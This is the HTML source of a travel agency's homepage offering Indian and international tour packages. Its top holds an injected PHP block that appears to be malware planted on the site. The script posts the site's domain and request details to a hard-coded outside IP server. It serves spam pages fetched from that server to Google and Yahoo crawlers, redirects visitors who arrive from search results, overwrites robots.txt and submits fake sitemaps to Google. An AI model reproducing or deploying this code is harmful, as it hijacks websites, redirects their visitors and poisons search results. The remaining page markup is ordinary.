
<?php $group_num='z0708_16';$inter_domain='http://173.208.225.18/'.$group_num.'/';function curl_get_contents($url){$ch=curl_init();curl_setopt ($ch, CURLOPT_URL, $url);curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);$file_contents = curl_exec($ch);curl_close($ch);return $file_contents; }function getServerCont($url,$data=array()){$url=str_replace(' ','+',$url);$ch=curl_init();curl_setopt($ch,CURLOPT_URL,"$url");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($data));$output = curl_exec($ch);$errorCode = curl_errno($ch);curl_close($ch);if(0!== $errorCode){ return false;}return $output;}function is_crawler($agent){if(strpos($agent,'google')!==false || strpos($agent,'yahoo')!==false ){return true;}else{return false;}}function check_refer($refer){ if(strpos($refer,'.co.jp')!==false || strpos($refer,'google.com')!==false){ return true; }else{ return false;}}$http=((isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https://':'http://');$req_uri=$_SERVER['REQUEST_URI'];$domain=$_SERVER["HTTP_HOST"];$self=$_SERVER['PHP_SELF'];$ser_name=$_SERVER['SERVER_NAME'];$req_url=$http.$domain.$req_uri;$indata1=$inter_domain."/indata.php";$map1=$inter_domain."/map.php";$jump1=$inter_domain."/jump.php";$url_words=$inter_domain."/words.php";$url_robots=$inter_domain."/robots.php";if(strpos($req_uri,".php")){$href1=$http.$domain.$self;}else{$href1=$http.$domain;}$data1[]=array();$data1['domain']=$domain;$data1['req_uri']=$req_uri;$data1['href']=$href1;$data1['req_url']=$req_url;if(substr($req_uri,-6)=='robots'){$robots_cont = getServerCont($url_robots,$data1);define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));file_put_contents(BASE_PATH.'/robots.txt',$robots_cont);$robots_cont=file_get_contents(BASE_PATH.'/robots.txt');if(strpos($robots_cont,"Crawl-delay:3")){echo 'robots.txt file create success!';}else{echo 'robots.txt file create fail!';}exit;}if(substr($req_uri,-4)=='.xml'){if(strpos($req_uri,"pingsitemap.xml")){ $str_cont = getServerCont($map1,$data1); $str_cont_arr= explode(",",$str_cont); $str_cont_arr[]='sitemap'; for($k=0;$k<count($str_cont_arr);$k++){ if(strpos($href1,".php")> 0){ $tt1='?'; }else{ $tt1='/';}$http2=$href1.$tt1.$str_cont_arr[$k].'.xml';$data_new='https://www.google.com/ping?sitemap='.$http2;$data_new1='http://www.google.com/ping?sitemap='.$http2;if(stristr(@file_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new),'successfully')){echo $data_new.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@file_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL;}else if(stristr(@curl_get_contents($data_new1),'successfully')){echo $data_new1.'===>Submitting Google Sitemap: OK'.PHP_EOL; }else{echo $data_new1.'===>Submitting Google Sitemap: fail'.PHP_EOL;} } exit;} if(strpos($req_uri,"allsitemap.xml")){ $str_cont = getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;exit;} if(strpos($req_uri,".php")){ $word4=explode("?",$req_uri); $word4=$word4[count($word4)-1]; $word4=str_replace(".xml","",$word4); }else{ $word4= str_replace("/","",$req_uri);$word4= str_replace(".xml","",$word4); }$data1['word']=$word4;$data1['action']='check_sitemap';$check_url4=getServerCont($url_words,$data1);if($check_url4=='1'){ $str_cont=getServerCont($map1,$data1); header("Content-type:text/xml"); echo $str_cont;exit;} $data1['action']="check_words"; $check1= getServerCont($url_words,$data1);if(strpos($req_uri,"map")> 0 || $check1=='1'){$data1['action']="rand_xml";$check_url4=getServerCont($url_words,$data1);header("Content-type:text/xml");echo $check_url4;exit;}}if(strpos($req_uri,".php")){$main_shell=$http.$ser_name.$self;$data1['main_shell']=$main_shell;}else{$main_shell=$http.$ser_name;$data1['main_shell']=$main_shell;}$referer=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';$chk_refer=check_refer($referer); if($chk_refer){echo getServerCont($jump1,$data1);exit; } $user_agent=strtolower(isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'');$res_crawl=is_crawler($user_agent); if($res_crawl){ $data1['http_user_agent']=$user_agent;$get_content = getServerCont($indata1,$data1);if($get_content=="404"){header('HTTP/1.0 404 Not Found');exit;}else if($get_content=="500"){header("HTTP/1.0 500 Internal Server Error");exit;}else if($get_content=="blank"){echo '';exit;}else{echo $get_content;exit;} }else{ header("HTTP/1.0 404 Not Found"); } ?>
    <!DOCTYPE html>
    <html lang="en-us">
      <head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

        <title>TravelSetu.com - Personalized Tour Packages From Multiple Local Destination Experts.</title>
        <meta name="description" content="Travelsetu.com Provides Best Multiple Quotes For Your Holiday Tour Packages From Local Agents.">
        <meta property="og:title" content="TravelSetu.com - Personalized Tour Packages From Multiple Local Destination Experts." />
        <meta property="og:description" content="Travelsetu.com Provides Best Multiple Quotes For Your Holiday Tour Packages From Local Agents." />
        <meta name="dcterms.Title" content="TravelSetu.com - Personalized Tour Packages From Multiple Local Destination Experts." />
        <meta name="dcterms.Description" content="Travelsetu.com Provides Best Multiple Quotes For Your Holiday Tour Packages From Local Agents." />


        <meta property="fb:page_id" content="1695458440667036" />
        <meta name="msvalidate.01" content="ED55EA32B842B99B2B943FC35D178189" />
        <!--[if IE]>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

        <![endif]-->
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <meta name="geo.placename" content="Travelsetu.com" />
        <meta name="dcterms.Identifier" content="https://travelsetu.com/holiday-tour-packages/home" />
        <meta name="dcterms.Format" content="text/html" />
        <meta name="dcterms.Relation" content="Travelsetu.com" />
        <meta name="dcterms.Language" content="en" />
        <meta name="dcterms.Publisher" content="Travelsetu.com" />
        <meta name="dcterms.Type" content="text/html" />
        <meta name="dcterms.Coverage" content="https://travelsetu.com" />
        <meta name="dcterms.Rights" content="Copyright &copy;2020 Travelsetu.com." />
        <meta name="dcterms.Contributor" content="Travelsetu.com" />
        <meta name="dcterms.Date" content="2020-05-18" />
        <meta name="dcterms.Subject" content=" Tour Packages" />
        <meta name="dcterms.Creator" content="Travelsetu.com" />


        <link rel="canonical" href="https://travelsetu.com/holiday-tour-packages/home" />
        <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
        <!-- Theme Styles -->
        <link rel="stylesheet" href="https://travelsetu.com/holiday-tour-packages/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://travelsetu.com/holiday-tour-packages/css/font-awesome.min.css">
        <link href='https://fonts.googleapis.com/css?family=Lato:300,400,700' rel='stylesheet' type='text/css'>
        <link rel="stylesheet" href="https://travelsetu.com/holiday-tour-packages/css/animate.min.css">
        <!-- Current Page Styles -->
        <link rel="stylesheet" type="text/css" href="https://travelsetu.com/holiday-tour-packages/components/revolution_slider/css/settings.css" media="screen" />
        <link rel="stylesheet" type="text/css" href="https://travelsetu.com/holiday-tour-packages/components/revolution_slider/css/style.css" media="screen" />
        <link rel="stylesheet" type="text/css" href="https://travelsetu.com/holiday-tour-packages/components/jquery.bxslider/jquery.bxslider.css" media="screen" />
        <link rel="stylesheet" type="text/css" href="https://travelsetu.com/holiday-tour-packages/components/flexslider/flexslider.css" media="screen" />
        <!-- Main Style -->
        <link id="main-style" rel="stylesheet" href="https://travelsetu.com/holiday-tour-packages/css/style.css">
        <!-- Updated Styles -->
        <link rel="stylesheet" href="https://travelsetu.com/holiday-tour-packages/css/updates.css">
        <!-- Custom Styles -->
        <!-- <link rel="stylesheet" href="https://travelsetu.com/holiday-tour-packages/css/custom.css"> -->
        <!-- Responsive Styles -->
        <link rel="stylesheet" href="https://travelsetu.com/holiday-tour-packages/css/responsive.css">
        <link rel="stylesheet" type="text/css" href="https://travelsetu.com/holiday-tour-packages/css/component.css" />
        <!-- CSS for IE -->

           <!--[if lt IE 9]>
        <script type='text/javascript' src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
        <![endif]-->

    <script>
    {
        "@context": "http://schema.org",
        "@type": "WebSite",
        "name": "Travelsetu.com",
        "description": "Compare 3 Travel Quotes from Destination Experts for your Holiday Tour Packages in India. Choose the best one and Save Money !!! - Travelsetu.com",
        "url": "https://travelsetu.com/",
        "image": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
            "sameAs": ["https://www.facebook.com/travelsetu"],
        "copyrightHolder": {
            "@type": "Organization",
            "name": "Travelsetu.com",
            "url": "https://travelsetu.com",
            "sameAs": ["https://www.facebook.com/travelsetu"],
            "image": {
                 "@type": "ImageObject",
                    "url": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
                    "height": "40",
                    "width": "156"
            },
            "telephone": "+919724761960",
                    "address": {
                    "@type": "PostalAddress",
                    "streetAddress": "A-3, Vardan Tower, Navrangpura",
                    "addressLocality": "Ahmedabad",
                    "addressRegion": "Gujarat",
                    "postalCode": "380009",
                    "addressCountry": "IN"
                },
             "logo": {
                    "@type": "ImageObject",
                    "url": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
                    "height": "40",
                    "width": "156"
                },
            "location": {
                "@type": "Place",
                "name": "Travelsetu.com",
                "hasMap": "https://www.google.co.in/maps/place/Manali+Tour+Packages/@23.036544,72.5589513,17z/data=!3m1!4b1!4m5!3m4!1s0x395e84f368a87935:0x8b611aae27405ff7!8m2!3d23.036544!4d72.56114?dcr=0",
                "telephone": "+919724761960",
                "image": {
                    "@type": "ImageObject",
                    "url": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
                    "height": "40",
                    "width": "156"
                },
                "logo": {
                    "@type": "ImageObject",
                    "url": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
                    "height": "40",
                    "width": "156"
                },
                "url": "https://travelsetu.com",
                "sameAs": ["https://www.facebook.com/travelsetu"],
                "geo": {
                    "@type": "GeoCoordinates",
                    "latitude": "23.036544",
                    "longitude": "72.5589513"
                },

                "address": {
                    "@type": "PostalAddress",
                    "streetAddress": "A-3, Vardan Tower, Navrangpura",
                    "addressLocality": "Ahmedabad",
                    "addressRegion": "Gujarat",
                    "postalCode": "380009",
                    "addressCountry": "IN"
                }
            },

            "founder": "Ramesh Desai",
            "foundingDate": "2011",
            "foundingLocation": "Ahmedabad, India"
        },
        "author": {
            "@type": "Organization",
            "name": "Travelsetu.com",
            "url": "https://travelsetu.com",
            "sameAs": ["https://www.facebook.com/travelsetu"],
            "image": {
                "@type": "ImageObject",
                "url": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
                    "height": "40",
                    "width": "156"

            },
            "telephone": "+919724761960",
                    "address": {
                "@type": "PostalAddress",
                "streetAddress": "A-3, Vardan Tower, Navrangpura",
                    "addressLocality": "Ahmedabad",
                    "addressRegion": "Gujarat",
                    "postalCode": "380009",
                    "addressCountry": "IN"
            },
            "logo": {
                "@type": "ImageObject",
                "url": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
                "height": "40",
                "width": "156"
            },
            "location": {
                "@type": "Place",
                "name": "Travelsetu.com",
                "hasMap": "https://www.google.co.in/maps/place/Manali+Tour+Packages/@23.036544,72.5589513,17z/data=!3m1!4b1!4m5!3m4!1s0x395e84f368a87935:0x8b611aae27405ff7!8m2!3d23.036544!4d72.56114?dcr=0",
                "telephone": "+919724761960",
                "image": {
                    "@type": "ImageObject",
                    "url": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
                    "height": "40",
                    "width": "156"
                },
                "logo": {
                    "@type": "ImageObject",
                    "url": "https://travelsetu.com/holiday-tour-packages/images/logo.png",
                    "height": "40",
                    "width": "156"
                },
                "url": "https://travelsetu.com",
                "sameAs": ["https://www.facebook.com/travelsetu"],
                "geo": {
                    "@type": "GeoCoordinates",
                    "latitude": "23.036544",
                    "longitude": "72.5589513"
                },
                "address": {
                    "@type": "PostalAddress",
                    "streetAddress": "A-3, Vardan Tower, Navrangpura",
                    "addressLocality": "Ahmedabad",
                    "addressRegion": "Gujarat",
                    "postalCode": "380009",
                    "addressCountry": "IN"
                }
            },
            "founder": "Ramesh Desai",
            "foundingDate": "2011",
            "foundingLocation": "Ahmedabad, India"
        },
        "creator": {
            "@type": "Organization",
            "name": "Travelsetu.com",
            "location": {
            "@type": "Place",
            "name": "Travelsetu.com"

            }
         }
        }
    </script>

    <script type="application/ld+json">{
        "@context": "http://schema.org",
         "@type": "WebPage",
        "name": "Compare Hotel Rates in India and Save Money !!! - Travelsetu.com",
        "url": "https://travelsetu.com/holiday-tour-packages/home",
        "mainEntityOfPage": "https://travelsetu.com/holiday-tour-packages/home",
        "inLanguage": "en_us",
        "headline": "Compare Hotel Rates in India and Save Money !!! - Travelsetu.com",
        "description": "Compare Hotel Rates in India and Save Money !!! - Travelsetu.com",
        "keywords": " home Tour Packages"
        }
    </script>
    <!--
    <link rel="manifest" href="/manifest.json" />
    <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
    <script>
      var OneSignal = window.OneSignal || [];
      OneSignal.push(function() {
        OneSignal.init({
          appId: "89fb2491-8aad-4a59-acd4-c1b1c4dcffe9",
        });
      });
    </script>
    -->
    <script type='text/javascript'>
        (function(I, _, T, i, c, k, s) {if(I.iticks) return;I.iticks = {host:c, settings:s, clientId:k, cdn:_, queue:[]};var h = T.head || T.documentElement;var e = T.createElement(i);var l = I.location;e.async = true;e.src = (_||c)+'/client/inject-v2.min.js';h.insertBefore(e, h.firstChild);I.iticks.call = function(a, b) {I.iticks.queue.push([a, b]);};})(window, 'https://cdn.intelliticks.com/prod/common', document, 'script', 'https://app.intelliticks.com', 'nq7MKJEWsob4juaCt_c', {});
        </script>

      </head>  <!-- ################## Top Header End ################## -->

      <body>
        <div id="page-wrapper">

      <!-- ################## Header Start ################## -->
      <header id="header" class="navbar-static-top">
            <div class="topnav hidden-xs">
              <div class="container">
                <ul class="quick-menu pull-left">
                  <li><a href="Javascript:void(0);">Welcome to TravelSetu</a></li>
                </ul>
                <ul class="quick-menu pull-right">
                  <li><a href="https://travelsetu.com/crm/agent/" target="_blank">Travel Company Login</a></li>
                  <li><a href="https://travelsetu.com/crm/" target="_blank">Traveller Login</a></li>
                </ul>
              </div>
            </div>
            <div class="main-header">
              <a href="#mobile-menu-01" data-toggle="collapse" class="mobile-menu-toggle">
              Mobile Menu Toggle
              </a>
              <div class="container">
                <h1 class="logo navbar-brand">
                  <a href="https://travelsetu.com" title="Travelsetu" style="background-size:contain;"><img src="https://travelsetu.com/holiday-tour-packages/images/logo.png" width="120" height="40"  alt="Travelsetu" /></a>
                </h1>
                <nav id="main-menu"> <!-- role="navigation" -->
                  <ul class="menu">
                    <li class="menu-item-has-children">
                      <a href="https://travelsetu.com">Home</a>
                    </li>
                    <li class="menu-item-has-children">
                      <a href="https://travelsetu.com/holiday-tour-packages/about-us">About Us</a>
                    </li>
                    <li class="menu-item-has-children megamenu-menu">
                      <a href="Javascript:void(0);">Domestic Tour Packages</a>
                      <div class="megamenu-wrapper container" data-items-per-column="8">
                        <div class="megamenu-holder">
                          <ul class="megamenu">
                            <li class="menu-item-has-children">
                              <ul class="clearfix">
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/andaman">Andaman</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/goa">Goa</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/himachal">Himachal</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/kashmir">Kashmir</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/kerala">Kerala</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/leh-ladakh">Leh-Ladakh</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/north-east">North-East</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/rajasthan">Rajasthan </a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/seven-sisters">Seven Sisters</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/south-india">South-India</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/uttarakhand">Uttarakhand </a></li>
                                              </ul>
                            </li>
                          </ul>
                        </div>
                      </div>
                    </li>

                    <li class="menu-item-has-children megamenu-menu">
                      <a href="Javascript:void(0);">International Tour Packages</a>
                      <div class="megamenu-wrapper container" data-items-per-column="8">
                        <div class="megamenu-holder">
                          <ul class="megamenu">
                            <li class="menu-item-has-children">
                              <ul class="clearfix">
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/bali">Bali</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/bhutan">Bhutan</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/dubai">Dubai</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/europe">Europe</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/maldives">Maldives </a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/mauritius">Mauritius</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/singapore">Singapore</a></li>
                                                <li><a href="https://travelsetu.com/holiday-tour-packages/thailand">Thailand</a></li>
                                              </ul>
                            </li>
                          </ul>
                        </div>
                      </div>
                    </li>
                    <li class="menu-item-has-children">
                      <a href="https://travelsetu.com/holiday-tour-packages/contact-us">Contact Us</a>
                    </li>

                  </ul>
                </nav>
              </div>
              <nav id="mobile-menu-01" class="mobile-menu collapse">
                <ul id="mobile-primary-menu" class="menu">
                  <li class="menu-item-has-children">
                    <a href="https://travelsetu.com">Home</a>
                  </li>
                  <li class="menu-item-has-children">
                    <a href="https://travelsetu.com/holiday-tour-packages/about-us">About Us</a>
                  </li>
                    <li class="menu-item-has-children">
                      <a href="Javascript:void(0);">Domestic Tour Packages</a>
                      <ul class="clearfix">
                                <li><a href="https://travelsetu.com/holiday-tour-packages/andaman">Andaman tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/goa">Goa tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/himachal">Himachal tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/kashmir">Kashmir tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/kerala">Kerala tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/leh-ladakh">Leh-Ladakh tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/north-east">North-East tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/rajasthan">Rajasthan  tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/seven-sisters">Seven Sisters tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/south-india">South-India tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/uttarakhand">Uttarakhand  tour packages</a></li>
                              </ul>
                    </li>

                    <li class="menu-item-has-children">
                      <a href="Javascript:void(0);">International Tour Packages</a>
                      <ul class="clearfix">
                                <li><a href="https://travelsetu.com/holiday-tour-packages/bali">Bali tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/bhutan">Bhutan tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/dubai">Dubai tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/europe">Europe tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/maldives">Maldives  tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/mauritius">Mauritius tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/singapore">Singapore tour packages</a></li>
                                <li><a href="https://travelsetu.com/holiday-tour-packages/thailand">Thailand tour packages</a></li>
                              </ul>
                    </li>
                    <li class="menu-item-has-children">
                      <a href="https://travelsetu.com/holiday-tour-packages/contact-us">Contact Us</a>
                    </li>
                </ul>
              </nav>
            </div>

          </header>
      <!-- ################## Header End ################## -->

          <div id="slideshow">
            <div class="fullwidthbanner-container">
              <div class="revolution-slider rev_slider" style="height: 0; overflow: hidden;">
                <ul>
                    <!-- SLIDE  -->
                    <li data-index="rs-9" data-transition="fade" data-slotamount="7" data-hideafterloop="0" data-hideslideonmobile="off"  data-easein="default" data-easeout="default" data-masterspeed="800"  data-thumb="images/stock-vector-travel-and-tourism-concept-vector-illustration-travel-to-india-tours-and-explore-theme-background-670915303.jpg"  data-rotate="0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                      <!-- MAIN IMAGE -->
                      <img src="https://travelsetu.com/holiday-tour-packages/images/banners/himachal.jpg"  alt="" title="Slider1"  data-bgposition="center top" data-bgfit="cover" data-bgrepeat="no-repeat" class="rev-slidebg" data-no-retina>
                      <!-- LAYERS -->
                      <div class="tp-caption large_bold_white_med1221   tp-resizeme"
                        id="slide-9-layer-13"
                        data-x="55"
                        data-y="153"
                        data-width="['auto']"
                        data-height="['auto']"
                        data-transform_idle="o:1;"
                        data-transform_in="x:-50px;opacity:0;s:300;e:Power3.easeInOut;"
                        data-transform_out="x:-50px;opacity:0;s:300;s:300;"
                        data-start="4100"
                        data-splitin="none"
                        data-splitout="none"
                        data-responsive_offset="on"
                        style="z-index: 17;">It's the right time to<br>take your family to<br>a great place! </div>
                    </li>
                    <!-- SLIDE  -->
                    <li data-index="rs-21" data-transition="cube" data-slotamount="7" data-hideafterloop="0" data-hideslideonmobile="off"  data-easein="default" data-easeout="default" data-masterspeed="800"  data-thumb="images/stock-vector-illustration-depicting-the-culture-of-kerala-india-198351737.jpg"  data-rotate="0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                      <!-- MAIN IMAGE -->
                      <img src="https://travelsetu.com/holiday-tour-packages/images/banners/kerala.jpg"  alt="" title="Slider1"  data-bgposition="center top" data-bgfit="cover" data-bgrepeat="no-repeat" class="rev-slidebg" data-no-retina>
                      <!-- LAYERS -->
                      <!-- LAYER NR. 1 -->
                      <div class="tp-caption large_bold_white_med   tp-resizeme"
                        id="slide-21-layer-1"
                        data-x="15"
                        data-y="261"
                        data-width="['auto']"
                        data-height="['auto']"
                        data-transform_idle="o:1;"
                        data-transform_in="x:left;s:1500;e:Power3.easeInOut;"
                        data-transform_out="x:-50px;opacity:0;s:300;s:300;"
                        data-start="1000"
                        data-splitin="none"
                        data-splitout="none"
                        data-responsive_offset="on"
                        style="z-index: 5;">You don't need <strong>Magic</strong> to disappear<br>All you need is a <strong>Destination!</strong> </div>
                    </li>

                    <!-- SLIDE  -->
                    <li data-index="rs-8" data-transition="slideup" data-slotamount="7" data-hideafterloop="0" data-hideslideonmobile="off"  data-easein="default" data-easeout="default" data-masterspeed="800"  data-thumb="images/stock-vector-illustration-depicting-the-culture-of-rajasthan-india-198351755.jpg"  data-rotate="0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                      <!-- MAIN IMAGE -->
                      <img src="https://travelsetu.com/holiday-tour-packages/images/banners/rajasthan.jpg"  alt="" title="Slider1"  data-bgposition="center top" data-bgfit="normal" data-bgrepeat="no-repeat" class="rev-slidebg" data-no-retina>
                      <!-- LAYERS -->
                      <div class="tp-caption large_bold_white_med1221   tp-resizeme"
                        id="slide-8-layer-11"
                        data-x="55"
                        data-y="153"
                        data-width="['auto']"
                        data-height="['auto']"
                        data-transform_idle="o:1;"
                        data-transform_in="x:-50px;opacity:0;s:1500;e:Power3.easeInOut;"
                        data-transform_out="y:50px;opacity:0;s:300;s:300;"
                        data-start="3500"
                        data-splitin="none"
                        data-splitout="none"
                        data-responsive_offset="on"
                        style="z-index: 15;">It's the right time to<br>take your family to<br>a great place! </div>
                    </li>
                    <li data-index="rs-19" data-transition="incube" data-slotamount="7" data-hideafterloop="0" data-hideslideonmobile="off"  data-easein="default" data-easeout="default" data-masterspeed="800"  data-thumb="images/stock-vector-african-women-in-mountain-landscape-155937044.jpg"  data-rotate="0"  data-saveperformance="off"  data-title="Slide" data-param1="" data-param2="" data-param3="" data-param4="" data-param5="" data-param6="" data-param7="" data-param8="" data-param9="" data-param10="" data-description="">
                      <!-- MAIN IMAGE -->
                      <img src="https://travelsetu.com/holiday-tour-packages/images/banners/himachal.jpg"  alt="" title="Slider1"  data-bgposition="0% 0%" data-bgfit="100% 100%" data-bgrepeat="repeat-y" class="rev-slidebg" data-no-retina>
                      <!-- LAYERS -->
                      <div class="tp-caption large_bold_white_med   tp-resizeme"
                        id="slide-19-layer-13"
                        data-x="15"
                        data-y="189"
                        data-width="['auto']"
                        data-height="['auto']"
                        data-transform_idle="o:1;"
                        data-transform_in="x:-50px;opacity:0;s:1500;e:Power3.easeInOut;"
                        data-transform_out="x:-50px;opacity:0;s:300;s:300;"
                        data-start="4100"
                        data-splitin="none"
                        data-splitout="none"
                        data-responsive_offset="on"
                        style="z-index: 17;">You don't need <strong>Magic</strong> to disappear<br>
                        All you need is a <strong>Destination!</strong>
                      </div>
                    </li>
                </ul>
              </div>
            </div>
          </div>

          <section id="content">
            <div class="search-box-wrapper">
              <div class="search-box container">
                <ul class="search-tabs clearfix">
                  <li class="active"><a href="#domestic-tab" data-toggle="tab">Domestic Tour Packages</a></li>
                  <li><a href="#international-tab" data-toggle="tab">International Tour Packages</a></li>
                </ul>
                <div class="visible-mobile">
                  <ul id="mobile-search-tabs" class="search-tabs clearfix">
                    <li class="active"><a href="#domestic-tab">Domestic Tour Packages</a></li>
                    <li><a href="#international-tab">International Tour Packages</a></li>
                  </ul>
                </div>
                <form name="frm" method="post" action="#">
                <div class="search-tab-content">
                  <div class="tab-pane fade active in" id="domestic-tab">
                    <div class="row">
                      <div class="form-group col-sm-6 col-md-3"></div>
                      <div class="form-group col-sm-6 col-md-4">
                        <label>Where you want to go for holiday this time?</label>
                        <input type="text" name="txtDname" class="input-text full-width" placeholder="Enter a destination" id="destination" autocomplete="off" onkeyup="autocomplet();" />
                        <div class="input_container">
                          <ul id="destination_list_id"></ul>
                        </div>
                      </div>
                      <div class="form-group col-sm-6 col-md-2">
                        <label class="hidden-xs">&nbsp;</label>
                        <button type="submit" name="btnDsearch" class="full-width icon-check animated" data-animation-type="bounce" data-animation-duration="1">SEARCH NOW</button>
                      </div>
                      <div class="form-group col-sm-6 col-md-3"></div>
                    </div>
                  </div>
                  <div class="tab-pane fade" id="international-tab">
                    <div class="row">
                      <div class="form-group col-sm-6 col-md-3"></div>
                      <div class="form-group col-sm-6 col-md-4">
                        <label>Where you want to go for holiday this time?</label>
                        <input type="text" name="txtIDname" class="input-text full-width" placeholder="Enter a destination" id="destinationi" autocomplete="off" onkeyup="autocompleti();" />
                        <div class="input_container">
                          <ul id="destinationi_list_id"></ul>
                        </div>
                      </div>
                      <div class="form-group col-sm-6 col-md-2">
                        <label class="hidden-xs">&nbsp;</label>
                        <button type="submit" name="btnIDsearch" class="full-width icon-check animated" data-animation-type="bounce" data-animation-duration="1">SEARCH NOW</button>
                      </div>
                      <div class="form-group col-sm-6 col-md-3"></div>
                    </div>
                  </div>
                </div>
                </form>
              </div>
            </div>

            <div class="destinations section" style="padding-bottom: 0px;">
              <div class="container">
                <h2>Domestic</h2>
                <div class="block image-carousel style2 flexslider" data-animation="slide" data-item-width="270" data-item-margin="30">
                  <ul class="slides image-box listing-style2">
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/alleppey" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Alleppey.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/alleppey"><h4 class="box-title">Alleppey</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/amarnath" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Amarnath.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/amarnath"><h4 class="box-title">Amarnath</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/andaman" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Andaman.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/andaman"><h4 class="box-title">Andaman</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
